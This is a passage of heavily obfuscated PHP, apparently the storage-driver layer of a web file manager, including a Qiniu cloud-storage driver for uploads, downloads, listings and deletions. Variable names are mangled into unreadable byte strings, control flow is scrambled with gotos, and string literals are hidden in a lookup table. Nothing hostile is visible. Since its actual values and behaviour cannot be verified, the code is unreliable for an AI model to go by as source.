Î‰ÍÌ∫ã = $this->model->addFileByRemote($A°ç¢ÏªŒ˘[$e©Éú√†å’[364]], $fê¶Ω‰Áﬁÿ, $eÇää˜®‘ﬁ, $CèœÇ∫Ú–é, $dÇﬂ˜“ÀîÜ); return $this->getPathOuter($a Î‰ÍÌ∫ã); } public function uploadLink($AŒå√åã¨⁄, $Döú’ãçáÙ = 0) { $E‚Á¿ÌÙ„ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $D¯Óñòı⁄° = $this->parse($AŒå√åã¨⁄); $AŒå√åã¨⁄ = Model($E‚Á¿ÌÙ„ü[536])->createFileName($D¯Óñòı⁄°[$E‚Á¿ÌÙ„ü[76]]); $FΩ±áûç¡Ë = IO::uploadLink($AŒå√åã¨⁄, $Döú’ãçáÙ); return $FΩ±áûç¡Ë; } public function fileNameAuto($E§ï”œà’È, $EìÓ’¬°¯Ù, $Aãêù¢Ã∏‹ = REPEAT_REPLACE, $eíïÎ«∫¬ = false) { return $this->model->fileNameAuto($E§ï”œà’È, $EìÓ’¬°¯Ù, $Aãêù¢Ã∏‹, $eíïÎ«∫¬); } public function fileNameExist($c–òŸéÛÊì, $E°ö≈èı´è) { return $this->model->fileNameExist($c–òŸéÛÊì, $E°ö≈èı´è); } protected function _fileOut($fîÔé≥—úÃ, $DÔïÑçÔÑø = false, $C⁄©Ôªœìë = false, $aâó¥πÑÒÿ = '', $d≥–€Àõñâ = false) { goto B•Ô¬Ïå⁄œ; B•Ô¬Ïå⁄œ: $FˆèÏÉ®ûÔ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eæ∫É¯ìÌ‡ = $this->model->sourceInfo($fîÔé≥—úÃ); if ($Eæ∫É¯ìÌ‡[$FˆèÏÉ®ûÔ[367]] == $FˆèÏÉ®ûÔ[84]) { header($FˆèÏÉ®ûÔ[1086]); die; } goto eø£¶•êéπ; B’ò€õ≥ƒı: if ($d≥–€Àõñâ) { return IO::fileOutServer($FŒò¨øäÕË[$FˆèÏÉ®ûÔ[76]], $DÔïÑçÔÑø, $cÚ‹ÑÌﬂÒı, $aâó¥πÑÒÿ); } IO::fileOut($FŒò¨øäÕË[$FˆèÏÉ®ûÔ[76]], $DÔïÑçÔÑø, $cÚ‹ÑÌﬂÒı, $aâó¥πÑÒÿ); goto B±““©ˆÙÙ; eø£¶•êéπ: $FŒò¨øäÕË = $this->model->fileInfoGet($fîÔé≥—úÃ); $aâó¥πÑÒÿ = $FŒò¨øäÕË[$FˆèÏÉ®ûÔ[160]] ? $FŒò¨øäÕË[$FˆèÏÉ®ûÔ[160]] : $aâó¥πÑÒÿ; $cÚ‹ÑÌﬂÒı = isset($GLOBALS[$FˆèÏÉ®ûÔ[1087]]) ? $GLOBALS[$FˆèÏÉ®ûÔ[1087]] : $Eæ∫É¯ìÌ‡[$FˆèÏÉ®ûÔ[28]]; goto B’ò€õ≥ƒı; B±““©ˆÙÙ: } public function fileOut($eÒ∆Ìóıœƒ, $EÖ°˜Ùò¢ƒ = false, $Dóã¡˜¥¿¥ = false, $C∫å·áôµÑ = '') { $this->_fileOut($eÒ∆Ìóıœƒ, $EÖ°˜Ùò¢ƒ, $Dóã¡˜¥¿¥, $C∫å·áôµÑ); } public function fileOutServer($Eà„’Œí«¶, $Fë∆˘ç≠€é = false, $A∑ü¥¡›⁄è = false, $eÙé¶≥ˆƒÖ = '') { $this->_fileOut($Eà„’Œí«¶, $Fë∆˘ç≠€é, $A∑ü¥¡›⁄è, $eÙé¶≥ˆƒÖ, !0); } protected function _fileOutImage($aä‚ÿœ“ÁÎ, $C ñ¥¡†Ï = 250) { $CÒ‘ﬂÃß∫  =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cç“®“Ÿèò = $this->model->sourceInfo($aä‚ÿœ“ÁÎ); if ($Cç“®“Ÿèò[$CÒ‘ﬂÃß∫ [367]] == $CÒ‘ﬂÃß∫ [84]) { show_json($CÒ‘ﬂÃß∫ [1088] . $aä‚ÿœ“ÁÎ, !1); } $GLOBALS[$CÒ‘ﬂÃß∫ [1087]] = $Cç“®“Ÿèò[$CÒ‘ﬂÃß∫ [28]]; $B¯ßÀîñ¨ä = $this->model->fileInfoGet($aä‚ÿœ“ÁÎ); IO::fileOutImage($B¯ßÀîñ¨ä[$CÒ‘ﬂÃß∫ [76]], $C ñ¥¡†Ï); } public function fileOutImage($E≠¡≤ôò≠–, $f¨ê∆¨‹∞ú = 250) { $this->_fileOutImage($E≠¡≤ôò≠–, $f¨ê∆¨‹∞ú); } public function fileOutImageServer($dÆØÖ◊±¨Ó, $dèæ›ŸÚ…â = 250) { $this->_fileOutImage($dÆØÖ◊±¨Ó, $dèæ›ŸÚ…â); } public function link($D›°á®“Öƒ, $EıµÔÉåÇå = '') { $EŒ◊ÿŸ¬Í∂ = $this->model->fileInfoGet($D›°á®“Öƒ); return IO::link($EŒ◊ÿŸ¬Í∂[$_SERVER[£¿ÌÙëü¡¯¯][76]], $EıµÔÉåÇå); } protected function parse($B…Ñﬁö±£Œ) { $b€”àÉŸñï =& $_SERVER[£¿ÌÙëü¡¯¯]; if (strstr($B…Ñﬁö±£Œ, $b€”àÉŸñï[8]) === !1) { return array($b€”àÉŸñï[382] => intval($B…Ñﬁö±£Œ), $b€”àÉŸñï[76] => $b€”àÉŸñï[33], $b€”àÉŸñï[1085] => array()); } $fØí∞ßÎÉ“ = explode($b€”àÉŸñï[8], trim($B…Ñﬁö±£Œ, $b€”àÉŸñï[8])); if (count($fØí∞ßÎÉ“) < 2) { show_tips($B…Ñﬁö±£Œ . $b€”àÉŸñï[1089]); } return array($b€”àÉŸñï[382] => intval($fØí∞ßÎÉ“[0]), $b€”àÉŸñï[76] => $fØí∞ßÎÉ“[1], $b€”àÉŸñï[1085] => array_slice($fØí∞ßÎÉ“, 1)); } } goto f§·ÒÆ„Ìﬁ; eæÙ…ø∏ªØ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($DÒâ¯ââæ®) { parent::__construct(); require_once SDK_DIR . $_SERVER[£¿ÌÙëü¡¯¯][1179]; $this->_init($DÒâ¯ââæ®); } public function _init($AœΩÇŒ°±Æ) { foreach ($AœΩÇŒ°±Æ as $fåÙ‡´öêî => $aÀÙ∑ô∏ëÊ) { if (isset($this->{$fåÙ‡´öêî})) { $this->{$fåÙ‡´öêî} = $aÀÙ∑ô∏ëÊ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[£¿ÌÙëü¡¯¯][1180], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BªÖ•å«Ω‰, $bÜ´±õ°ï¶ = '', $cÀ∏‰≥ã…∞ = REPEAT_RENAME) { if ($this->setContent($BªÖ•å«Ω‰, $bÜ´±õ°ï¶)) { return $this->getPathOuter($BªÖ•å«Ω‰); } return !1; } public function mkdir($b…µë‰ ⁄â, $EÜ◊ÇÀìØÂ = REPEAT_SKIP) { goto c†Ô∂ëﬁ¡Ù; F∆Öù‚Î“…: $b…µë‰ ⁄â = $AÔƒú¿˜–ã . $Fçé¨´∂∫â[8]; $c»É¥ä≥Ì≠ = get_path_this($AÔƒú¿˜–ã); $dÛ¿ÌÓè†∏ = $b…µë‰ ⁄â . $c»É¥ä≥Ì≠; goto FÇÑ≤àîì—; FÇÑ≤àîì—: if (!$this->mkfile($dÛ¿ÌÓè†∏)) { return !1; } if (!$this->moveFile($dÛ¿ÌÓè†∏, $b…µë‰ ⁄â)) { $this->delFile($dÛ¿ÌÓè†∏); return !1; } return $this->getPathOuter($AÔƒú¿˜–ã); goto Bıœ–àÈûò; c†Ô∂ëﬁ¡Ù: $Fçé¨´∂∫â =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÔƒú¿˜–ã = trim($b…µë‰ ⁄â, $Fçé¨´∂∫â[8]); if ($this->_isFolder($AÔƒú¿˜–ã)) { return $this->getPathOuter($AÔƒú¿˜–ã); } goto F∆Öù‚Î“…; Bıœ–àÈûò: } public function copyFile($f…ÖÕìÉÒ©, $cï‡Óû∆Û) { $f„¡¥®¨ùµ = $this->bucketManager->copy($this->bucket, $f…ÖÕìÉÒ©, $this->bucket, $cï‡Óû∆Û, !0); return $f„¡¥®¨ùµ ? !1 : !0; } public function moveFile($B‰¥≤„¯øÖ, $b„ú¬™ÿßƒ) { $Aé¶è¬£πÑ = $this->bucketManager->move($this->bucket, $B‰¥≤„¯øÖ, $this->bucket, $b„ú¬™ÿßƒ, !0); return $Aé¶è¬£πÑ ? !1 : !0; } public function delFile($aß¬–Ûß‰ı) { $eñÊô¿Â–ç = $this->bucketManager->delete($this->bucket, $aß¬–Ûß‰ı); return $eñÊô¿Â–ç ? !1 : !0; } public function delFolder($DﬂÖ®Ë£ïÍ) { $AåÃ’©®˘Ë = $this->fileList($DﬂÖ®Ë£ïÍ); if (empty($AåÃ’©®˘Ë)) { return !0; } $B¥£◊º–Ô≠ = 1000; if (count($AåÃ’©®˘Ë) <= $B¥£◊º–Ô≠) { return $this->qnDelObj($AåÃ’©®˘Ë) ? !1 : !0; } foreach (array_chunk($AåÃ’©®˘Ë, $B¥£◊º–Ô≠) as $EÕÃÑáá≈«) { $b©€õ¡ø›Ω = $this->qnDelObj($EÕÃÑáá≈«); if ($b©€õ¡ø›Ω) { return !1; } } return !0; } private function qnDelObj($Eﬁπ ôµ∑≈) { $Aäœ‹Íü’≠ = $this->bucketManager->buildBatchDelete($this->bucket, $Eﬁπ ôµ∑≈); list($C·ã’åµÍØ, $fÒÚá“õ≤Ö) = $this->bucketManager->batch($Aäœ‹Íü’≠); return $fÒÚá“õ≤Ö; } private function fileList($e—ƒÁ™∑Öÿ, $bàÕ∫⁄áƒî = 0) { goto d¯Ñ…êì–é; d¯Ñ…êì–é: $câì‰  µé =& $_SERVER[£¿ÌÙëü¡¯¯]; $e—ƒÁ™∑Öÿ = trim($e—ƒÁ™∑Öÿ, $câì‰  µé[8]); $eü‚õä∑®◊ = empty($e—ƒÁ™∑Öÿ) ? $câì‰  µé[33] : $e—ƒÁ™∑Öÿ . $câì‰  µé[8]; goto B—Û◊ï≤‰ß; D·÷Ÿ´ﬁÑÏ: $AÉ’ÓÚç≥— = array(); while (!0) { list($aÑÇïÓ¡Öë, $C€Çû©ÿÀã) = $this->bucketManager->listFiles($this->bucket, $eü‚õä∑®◊, $Aóòîì„ﬁ‰, $F†Ì¶›Ìãª, $b¨≥Ùßë¥◊); if ($C€Çû©ÿÀã) { return !1; } $Aóòîì„ﬁ‰ = array_key_exists($câì‰  µé[1150], $aÑÇïÓ¡Öë) ? $Aóòîì„ﬁ‰ = $aÑÇïÓ¡Öë[$câì‰  µé[1181]] : $câì‰  µé[33]; foreach ($aÑÇïÓ¡Öë[$câì‰  µé[1182]] as $C±Æ¶Êß»¯) { $FùﬂÓ‘ÙäÖ = $C±Æ¶Êß»¯[$câì‰  µé[90]]; if ($bàÕ∫⁄áƒî) { $FùﬂÓ‘ÙäÖ = array($câì‰  µé[28] => $FùﬂÓ‘ÙäÖ, $câì‰  µé[78] => $C±Æ¶Êß»¯[$câì‰  µé[1183]]); } $AÉ’ÓÚç≥—[] = $FùﬂÓ‘ÙäÖ; } if ($Aóòîì„ﬁ‰ == $câì‰  µé[33]) { break; } } return $AÉ’ÓÚç≥—; goto DˆÈëë ∂÷; B—Û◊ï≤‰ß: $Aóòîì„ﬁ‰ = $câì‰  µé[33]; $F†Ì¶›Ìãª = 1000; $b¨≥Ùßë¥◊ = $câì‰  µé[33]; goto D·÷Ÿ´ﬁÑÏ; DˆÈëë ∂÷: } public function rename($a¥ı™€ùïø, $Cúê⁄€¡ëπ) { return $this->renameObject($a¥ı™€ùïø, $Cúê⁄€¡ëπ); } public function fileInfo($fÿõæÃÇ¿œ, $eíäÜÙò‚Ï = false, $bÒøòıí±— = array()) { goto bªâÒô£ˆﬂ; bªâÒô£ˆﬂ: $f¶Ê‹‚ì≠ı =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($eíäÜÙò‚Ï) { return array($f¶Ê‹‚ì≠ı[28] => $this->pathThis($fÿõæÃÇ¿œ), $f¶Ê‹‚ì≠ı[76] => $this->getPathOuter($f¶Ê‹‚ì≠ı[8] . $fÿõæÃÇ¿œ), $f¶Ê‹‚ì≠ı[29] => $f¶Ê‹‚ì≠ı[164], $f¶Ê‹‚ì≠ı[78] => isset($bÒøòıí±—[$f¶Ê‹‚ì≠ı[1183]]) ? $bÒøòıí±—[$f¶Ê‹‚ì≠ı[1183]] : 0, $f¶Ê‹‚ì≠ı[157] => $this->ext($fÿõæÃÇ¿œ)); } $b◊‘πõîâÑ = array($f¶Ê‹‚ì≠ı[28] => $this->pathThis($fÿõæÃÇ¿œ), $f¶Ê‹‚ì≠ı[76] => $this->getPathOuter($f¶Ê‹‚ì≠ı[8] . $fÿõæÃÇ¿œ), $f¶Ê‹‚ì≠ı[29] => $f¶Ê‹‚ì≠ı[164], $f¶Ê‹‚ì≠ı[184] => 0, $f¶Ê‹‚ì≠ı[108] => 0, $f¶Ê‹‚ì≠ı[78] => 0, $f¶Ê‹‚ì≠ı[157] => $this->ext($fÿõæÃÇ¿œ), $f¶Ê‹‚ì≠ı[185] => !0, $f¶Ê‹‚ì≠ı[186] => !0); goto F©èÔœÓ≥ñ; F©èÔœÓ≥ñ: if (empty($bÒøòıí±—)) { $bÒøòıí±— = $this->objectMeta($fÿõæÃÇ¿œ); if (!$bÒøòıí±—) { return $b◊‘πõîâÑ; } } if (isset($bÒøòıí±—[$f¶Ê‹‚ì≠ı[1184]])) { $b◊‘πõîâÑ[$f¶Ê‹‚ì≠ı[184]] = $bÒøòıí±—[$f¶Ê‹‚ì≠ı[1184]]; } if (isset($bÒøòıí±—[$f¶Ê‹‚ì≠ı[1183]])) { $b◊‘πõîâÑ[$f¶Ê‹‚ì≠ı[78]] = $bÒøòıí±—[$f¶Ê‹‚ì≠ı[1183]]; } goto d∂˘ﬁΩ˘çÓ; d∂˘ﬁΩ˘çÓ: return $b◊‘πõîâÑ; goto c‰Ò∞ìâ∞ˆ; c‰Ò∞ìâ∞ˆ: } public function folderInfo($Aﬁ ∫ã¯◊Á, $Eí‚πÕÇ∫â = false) { $aœü≤ßØ»ê =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($Eí‚πÕÇ∫â) { return array($aœü≤ßØ»ê[28] => $this->pathThis($Aﬁ ∫ã¯◊Á), $aœü≤ßØ»ê[76] => $this->getPathOuter($aœü≤ßØ»ê[8] . $Aﬁ ∫ã¯◊Á), $aœü≤ßØ»ê[29] => $aœü≤ßØ»ê[77]); } $b…“∑÷¯áÆ = array($aœü≤ßØ»ê[28] => $this->pathThis($Aﬁ ∫ã¯◊Á), $aœü≤ßØ»ê[76] => $this->getPathOuter($aœü≤ßØ»ê[8] . $Aﬁ ∫ã¯◊Á), $aœü≤ßØ»ê[29] => $aœü≤ßØ»ê[77], $aœü≤ßØ»ê[184] => 0, $aœü≤ßØ»ê[108] => 0, $aœü≤ßØ»ê[1128] => !0, $aœü≤ßØ»ê[1129] => !0); if (empty($fﬁÌ∫∆Ñøø)) { $Aﬁ ∫ã¯◊Á = rtrim($Aﬁ ∫ã¯◊Á, $aœü≤ßØ»ê[8]) . $aœü≤ßØ»ê[8]; $B≤∏¶◊§ºÕ = $this->objectMeta($Aﬁ ∫ã¯◊Á); if (!$B≤∏¶◊§ºÕ) { return $b…“∑÷¯áÆ; } } if (isset($fﬁÌ∫∆Ñøø[$aœü≤ßØ»ê[1184]])) { $b…“∑÷¯áÆ[$aœü≤ßØ»ê[184]] = $fﬁÌ∫∆Ñøø[$aœü≤ßØ»ê[1184]]; } return $b…“∑÷¯áÆ; } public function listPath($e·»≈ﬂ◊î€, $bÆñè°ïÈß = false) { goto Dë°âﬂú∞à; Dë°âﬂú∞à: $eÔüúÍ≤¨Ö =& $_SERVER[£¿ÌÙëü¡¯¯]; $e·»≈ﬂ◊î€ = trim($e·»≈ﬂ◊î€, $eÔüúÍ≤¨Ö[8]); $eáÂåæ¨ù– = empty($e·»≈ﬂ◊î€) ? $eÔüúÍ≤¨Ö[33] : $e·»≈ﬂ◊î€ . $eÔüúÍ≤¨Ö[8]; goto cü÷π‡Í’å; cü÷π‡Í’å: $f‡éÁ—à£œ = $eÔüúÍ≤¨Ö[33]; $e≥©ôÂ‹ûÍ = 1000; $aÙó‚å¨çç = $eÔüúÍ≤¨Ö[8]; goto dô¨‹√ñ∂…; dô¨‹√ñ∂…: $e¿æùíî¨ç = $b∑êŸ©Ï÷Ω = array(); while (!0) { list($dà≈‡Éã¥±, $C»æµÏÜüÛ) = $this->bucketManager->listFiles($this->bucket, $eáÂåæ¨ù–, $f‡éÁ—à£œ, $e≥©ôÂ‹ûÍ, $aÙó‚å¨çç); if ($C»æµÏÜüÛ) { return !1; } $f‡éÁ—à£œ = array_key_exists($eÔüúÍ≤¨Ö[1150], $dà≈‡Éã¥±) ? $f‡éÁ—à£œ = $dà≈‡Éã¥±[$eÔüúÍ≤¨Ö[1181]] : $eÔüúÍ≤¨Ö[33]; if (isset($dà≈‡Éã¥±[$eÔüúÍ≤¨Ö[1185]])) { foreach ($dà≈‡Éã¥±[$eÔüúÍ≤¨Ö[1185]] as $a≠Öóä â¶) { if ($a≠Öóä â¶ == $eáÂåæ¨ù–) { continue; } $e¿æùíî¨ç[] = $this->folderInfo($a≠Öóä â¶, $bÆñè°ïÈß); } } if (isset($dà≈‡Éã¥±[$eÔüúÍ≤¨Ö[1182]])) { foreach ($dà≈‡Éã¥±[$eÔüúÍ≤¨Ö[1182]] as $AÍﬁÁıº°≥) { if ($AÍﬁÁıº°≥[$eÔüúÍ≤¨Ö[90]] == $eáÂåæ¨ù–) { continue; } $b∑êŸ©Ï÷Ω[] = $this->fileInfo($AÍﬁÁıº°≥[$eÔüúÍ≤¨Ö[90]], $bÆñè°ïÈß, $AÍﬁÁıº°≥); } } if ($f‡éÁ—à£œ == $eÔüúÍ≤¨Ö[33]) { break; } } return array($eÔüúÍ≤¨Ö[75] => $e¿æùíî¨ç, $eÔüúÍ≤¨Ö[74] => $b∑êŸ©Ï÷Ω); goto eöÓ»≈Æ”ﬂ; eöÓ»≈Æ”ﬂ: } public function has($Céàäúï∏√, $c£‹ÕçÊÍÎ = false, $dãµëê”¨Û = true) { goto BÉ⁄Âıµ∂€; A’µŒèà√é: if ($c£‹ÕçÊÍÎ) { return array($Eöœí±áßç[188] => $eü‰Á¨Óî‘, $Eöœí±áßç[189] => $aÃ¡ä∂‡ˆê); } return !1; goto C»àŒÉèç™; F®÷∏÷≥∂ã: $eü‰Á¨Óî‘ = 0; $aÃ¡ä∂‡ˆê = 0; while (!0) { list($E⁄çùï‰·´, $Aª¶ãàìª–) = $this->bucketManager->listFiles($this->bucket, $eØ…œµ¶≠ä, $aê‹‹ÿ–®º, $E¢´Ñ‹ÀﬂÛ, $dıÃΩùÙ¯è); if ($Aª¶ãàìª–) { return !1; } $aê‹‹ÿ–®º = array_key_exists($Eöœí±áßç[1150], $E⁄çùï‰·´) ? $aê‹‹ÿ–®º = $E⁄çùï‰·´[$Eöœí±áßç[1181]] : $Eöœí±áßç[33]; if ($c£‹ÕçÊÍÎ) { if (!empty($E⁄çùï‰·´[$Eöœí±áßç[1182]])) { $eü‰Á¨Óî‘ += count($E⁄çùï‰·´[$Eöœí±áßç[1182]]); } if (!empty($E⁄çùï‰·´[$Eöœí±áßç[1185]])) { $aÃ¡ä∂‡ˆê += count($E⁄çùï‰·´[$Eöœí±áßç[1185]]); } if ($aê‹‹ÿ–®º === $Eöœí±áßç[33]) { break; } continue; } if ($dãµëê”¨Û) { if (!empty($E⁄çùï‰·´[$Eöœí±áßç[1182]])) { return !0; } } else { if (!empty($E⁄çùï‰·´[$Eöœí±áßç[1185]])) { return !0; } } if ($aê‹‹ÿ–®º == $Eöœí±áßç[33]) { break; } } goto A’µŒèà√é; BÉ⁄Âıµ∂€: $Eöœí±áßç =& $_SERVER[£¿ÌÙëü¡¯¯]; $Céàäúï∏√ = trim($Céàäúï∏√, $Eöœí±áßç[8]); $eØ…œµ¶≠ä = empty($Céàäúï∏√) ? $Eöœí±áßç[33] : $Céàäúï∏√ . $Eöœí±áßç[8]; goto eÆàÛÓ¢Áò; eÆàÛÓ¢Áò: $aê‹‹ÿ–®º = $Eöœí±áßç[33]; $E¢´Ñ‹ÀﬂÛ = 1000; $dıÃΩùÙ¯è = $Eöœí±áßç[8]; goto F®÷∏÷≥∂ã; C»àŒÉèç™: } public function listAll($d∆Ê¬ò‘¯Ò) { $féîΩ–ÚŸﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DæÓËòıÂ” = $this->fileList($d∆Ê¬ò‘¯Ò, 1); $f’©Ñ—‡™Œ = array(); foreach ($DæÓËòıÂ” as $fÑª≤√æ˜á) { $f’©Ñ—‡™Œ[$fÑª≤√æ˜á[$féîΩ–ÚŸﬁ[28]]] = $fÑª≤√æ˜á[$féîΩ–ÚŸﬁ[78]]; } return $this->listAllFiles($d∆Ê¬ò‘¯Ò, array_keys($f’©Ñ—‡™Œ), $f’©Ñ—‡™Œ); } public function canRead($f˘Ü÷©∂†•) { return $this->exist($f˘Ü÷©∂†•) ? !0 : !1; } public function canWrite($c≈∂¡„£ßå) { return $this->exist($c≈∂¡„£ßå) ? !0 : !1; } public function getContent($D⁄ìÙÃæÍæ) { return $this->fileSubstr($D⁄ìÙÃæÍæ, 0, -1); } public function setContent($a∆’‰√™È, $FŒâ”¥∞¡À = '') { $FøæùÜ¶ò€ = $this->tempFile($this->pathThis($a∆’‰√™È)); file_put_contents($FøæùÜ¶ò€, $FŒâ”¥∞¡À); if ($this->upload($a∆’‰√™È, $FøæùÜ¶ò€)) { $this->tempFileRemve($FøæùÜ¶ò€); return !0; } return !1; } public function refreshUrls($bÓ—ßˆé⁄˜) { goto aµ≥Ó§‹Ë†; C≠ÉÀµ≥øÜ: $EºÓ„»üÉè = new Qiniu\Cdn\CdnManager($this->auth); list($dß¿›◊øêë, $Cö¬¬æﬂï—) = $EºÓ„»üÉè->refreshUrls($e§õ¨èÕ⁄ª); if ($Cö¬¬æﬂï—) { return !1; } goto eÇ£ëÉ‹Áπ; eÇ£ëÉ‹Áπ: return $dß¿›◊øêë[$aÃÿ∆õ¯ÏÒ[1186]] == $aÃÿ∆õ¯ÏÒ[683] ? !0 : !1; goto AãçÉŸËèì; aµ≥Ó§‹Ë†: $aÃÿ∆õ¯ÏÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e§õ¨èÕ⁄ª = array(); if (is_array($bÓ—ßˆé⁄˜)) { foreach ($bÓ—ßˆé⁄˜ as $fµø÷Œ¢Ú⁄) { $e§õ¨èÕ⁄ª[] = $this->link($fµø÷Œ¢Ú⁄); } } else { $e§õ¨èÕ⁄ª[] = $this->link($bÓ—ßˆé⁄˜); } goto C≠ÉÀµ≥øÜ; AãçÉŸËèì: } public function fileSubstr($b˜ù‹ı¬‚Ç, $DõôÉÑè›Î, $Eñô€Ω„çÛ) { $B£ÓÉà≠Õñ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!($f‡„ÃæßÏ— = $this->link($b˜ù‹ı¬‚Ç))) { return !1; } $f¬π¬⁄”¨Ò = array($B£ÓÉà≠Õñ[1153] => $DõôÉÑè›Î, $B£ÓÉà≠Õñ[322] => $Eñô€Ω„çÛ); return $this->qnRequest($f‡„ÃæßÏ—, $f¬π¬⁄”¨Ò); } public function upload($Eåƒ„éêó˜, $B≥¬Ù·Ñ“∂, $fÆ‚Ô®⁄¡¿ = false, $E≈‰◊€Ú—û = REPEAT_REPLACE) { $c£œáèØÆº = new Qiniu\Storage\UploadManager(); $bÈ“‡ÕåáË = $this->auth->uploadToken($this->bucket, $Eåƒ„éêó˜); $Dßƒ»äéàˆ = get_file_mime(get_path_ext($B≥¬Ù·Ñ“∂)); list($b∂ä”…ƒÁ˘, $E◊ì«ûíƒ€) = $c£œáèØÆº->putFile($bÈ“‡ÕåáË, $Eåƒ„éêó˜, $B≥¬Ù·Ñ“∂, null, $Dßƒ»äéàˆ); return $E◊ì«ûíƒ€ ? !1 : $this->getPathOuter($Eåƒ„éêó˜); } public function uploadFormData($F÷¡ÎÓìÙ·, $có ˜÷¡’à = 3600) { return $this->uploadToken($F÷¡ÎÓìÙ·, $có ˜÷¡’à); } public function multiUploadFormData($b†©ΩÂÈøâ, $b’‰‰À˘œ  = 3600) { return $this->uploadToken($b†©ΩÂÈøâ, $b’‰‰À˘œ ); } private function uploadToken($c”áññèßÏ, $d˜â∫ÚﬂÒ‚ = 3600) { goto C†óàæáÂÓ; cø¨íÑ‚€’: $dÑ®ÒÔ∆”± = http_type() . "\72\57\57\x75\x70\154\x6f\x61\x64{$cÓÜˆ°ï—∏}\x2e\x71\151\x6e\x69\165\160\56\143\x6f\155\x2f"; return array($cﬂªµ¿Üƒ„[1190] => $cœÚ”ªÇüí, $cﬂªµ¿Üƒ„[1191] => $dÑ®ÒÔ∆”±); goto C≈ŸÔﬁÛç–; C†óàæáÂÓ: $cﬂªµ¿Üƒ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B¡¯öÜ»î∆ = $d˜â∫ÚﬂÒ‚; $bÌ®ÌÔú©√ = array($cﬂªµ¿Üƒ„[1187] => $cﬂªµ¿Üƒ„[1188]); goto Cíñ„°ùÈ™; Cíñ„°ùÈ™: $E‡˘íÏ‘Çı = null; $cœÚ”ªÇüí = $this->auth->uploadToken($this->bucket, $E‡˘íÏ‘Çı, $B¡¯öÜ»î∆, $bÌ®ÌÔú©√, !0); $cÓÜˆ°ï—∏ = empty($this->region) || $this->region == $cﬂªµ¿Üƒ„[1189] ? $cﬂªµ¿Üƒ„[33] : $cﬂªµ¿Üƒ„[408] . $this->region; goto cø¨íÑ‚€’; C≈ŸÔﬁÛç–: } public function download($Bœçåâüπß, $c–ˆ äõ¯£) { goto Aı—æÏœÏõ; b·Á¿≥ê¬Ú: while (!0) { $B≤î†Ø’—Ω = array($DµÎ√¿∫å¿[1153] => $d¬‰î¶Î∆Ç, $DµÎ√¿∫å¿[322] => $Bèã–ÖÍœâ); $F∂Ê¶†ºÏå = $this->qnRequest($E®ë“Ó¢Ω¯, $B≤î†Ø’—Ω); if ($d¬‰î¶Î∆Ç && ($cﬁèπ÷Ò–ﬁ = @json_decode($F∂Ê¶†ºÏå, !0))) { if (isset($cﬁèπ÷Ò–ﬁ[$DµÎ√¿∫å¿[1186]])) { return !1; } } fwrite($F†ÎäÀïµ–, $F∂Ê¶†ºÏå); $d¬‰î¶Î∆Ç += $Bèã–ÖÍœâ; if (strlen($F∂Ê¶†ºÏå) < $Bèã–ÖÍœâ) { break; } } fclose($F†ÎäÀïµ–); return $c–ˆ äõ¯£; goto FØ£ùË∫à°; Aı—æÏœÏõ: $DµÎ√¿∫å¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $büÀß√ÈëÊ = IO::getPathInner(IO::mkfile($c–ˆ äõ¯£)); if (!($E®ë“Ó¢Ω¯ = $this->link($Bœçåâüπß))) { return !1; } goto a¡“›ÑêÀ ; a¡“›ÑêÀ : $d¬‰î¶Î∆Ç = 0; $Bèã–ÖÍœâ = 1024 * 200; $F†ÎäÀïµ– = fopen($büÀß√ÈëÊ, $DµÎ√¿∫å¿[1192]); goto b·Á¿≥ê¬Ú; FØ£ùË∫à°: } public function link($cüä∆ﬂ¡ÏØ, $Eµ©î››Ÿå = '') { if (!$this->isFile($cüä∆ﬂ¡ÏØ)) { return !1; } $A—ºãµ∆öÆ = $this->getHost() . $_SERVER[£¿ÌÙëü¡¯¯][8] . $this->pathEncode($cüä∆ﬂ¡ÏØ) . $Eµ©î››Ÿå; return $this->auth->privateDownloadUrl($A—ºãµ∆öÆ, 3600 * 12); } public function fileOut($c—ÇÊÕ∂Ü¶, $fÂÑ‹º¶ê∏ = false, $EäßƒùÁßÁ = false, $f˜¢∏´ªÈ = '') { $A†Ü÷ú‚ïΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$EäßƒùÁßÁ) { $EäßƒùÁßÁ = $this->pathThis($c—ÇÊÕ∂Ü¶); } $bÇô†ê”É¶ = $fÂÑ‹º¶ê∏ ? $A†Ü÷ú‚ïΩ[1193] . rawurlencode($EäßƒùÁßÁ) : $A†Ü÷ú‚ïΩ[33]; $eó©çâËÚ˜ = $this->link($c—ÇÊÕ∂Ü¶, $bÇô†ê”É¶); $this->fileOutLink($eó©çâËÚ˜); } public function fileOutServer($A˜†à°…ç , $eé®Öí Ùú = false, $A∫ëú°íè = false, $E∞µÜÉîâù = '') { parent::fileOut($A˜†à°…ç , $eé®Öí Ùú, $A∫ëú°íè, $E∞µÜÉîâù); } public function fileOutImage($e∏å¥æÑàê, $d’…éû∞éÉ = 250) { $B”πΩ¥ÉÉ† = $this->link($e∏å¥æÑàê, $_SERVER[£¿ÌÙëü¡¯¯][1194] . $d’…éû∞éÉ); $this->fileOutLink($B”πΩ¥ÉÉ†); } public function fileOutImageServer($açÃîï∂≥¡, $bº›ä–Ï´ì = 250) { parent::fileOutImage($açÃîï∂≥¡, $bº›ä–Ï´ì); } public function hashMd5($aÏüå°™õ¨) { $Bƒô¬ÜΩ≤¡ =& 